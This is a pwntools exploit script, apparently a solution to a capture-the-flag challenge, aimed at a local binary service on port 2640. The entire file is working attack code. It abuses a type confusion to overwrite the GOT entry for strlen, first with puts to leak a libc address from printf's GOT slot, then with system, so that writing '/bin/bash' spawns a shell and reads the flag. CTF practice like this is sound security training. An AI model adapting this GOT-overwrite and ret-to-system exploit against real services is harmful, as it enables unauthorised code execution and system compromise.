#!/usr/bin/env python3

from pwn import *

elf = ELF("../server/app/chall.elf", False)
libc = ELF("libc.so.6", False)

s = remote("localhost", 2640)


def set_data_to(data: bytes):

    s.sendlineafter(b": ", b"c")
    s.sendlineafter(b"(max 256 chars): ", data)


def set_addr_to(addr: int):

    s.sendlineafter(b": ", b"n")
    s.sendlineafter(b"NFT:", str(addr).encode())


def play():
    s.sendlineafter(b": ", b"p")


def main():

    # 1. Redirect strlen() to puts() for leaking
    #   1.1. Create a "compliment" (sign of attention) to trigger strlen()
    #   1.2. Reinterpret the compliment as a "NFT" and write the address GOT@strlen
    #   1.3. Reinterpret it back as a compliment to write PLT@puts to GOT@strlen

    set_data_to(b"Start attack!")
    set_addr_to(elf.got.strlen)
    set_data_to(p64(elf.plt.puts))

    # 2. Leak libc address
    #   2.1. Modify the NFT to point to GOT@printf
    #   2.2. Play the compliment — strlen() (now puts) leaks GOT@printf

    set_addr_to(elf.got.printf)

    play()
    trash, leak = s.recvline(), s.recvline(False)
    addr = u64(leak.ljust(8, b"\x00"))
    libc.address = addr - libc.sym.printf
    s.success(f"Libc base is: {hex(libc.address)}")

    # 3. Redirect strlen() to system()
    #   3.1. Create another compliment
    #   3.2. Reinterpret it as a NFT to point to GOT@strlen
    #   3.3. Reinterpret again as a compliment to write libc@system to GOT@strlen

    set_data_to(b"Continue attack!!")
    set_addr_to(elf.got.strlen)
    set_data_to(p64(libc.sym.system))

    # 4. Get a shell
    #   4.1. Reuse the compliment as a NFT to point to writable memory
    #   4.2. Reinterpret it as a compliment to write '/bin/bash\x00'
    #   4.3. Trigger strlen() — now system('/bin/bash') is executed

    set_addr_to(elf.sym.data_start)
    set_data_to(b"/bin/bash\x00")
    play()

    s.sendline(b"cat flag.txt")
    s.interactive()


if __name__ == "__main__":
    main()